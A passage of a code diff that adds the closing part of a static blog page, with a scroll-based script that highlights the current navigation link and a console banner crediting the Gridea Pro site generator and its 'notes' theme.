+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  <script>console.log("\n%c ✦ Gridea Pro v0.0.0-dev %c · Theme: notes v1.2.0 · https://gridea.pro %c\n","color:#fadfa3;background:#111111;padding:9px 14px;border-radius:4px 0 0 4px;font-weight:500;font-size:12px","color:#e05c00;background:#fff3ec;padding:9px 14px;border-radius:0 4px 4px 0;font-size:11px","")</script>
+</body>
+</html>
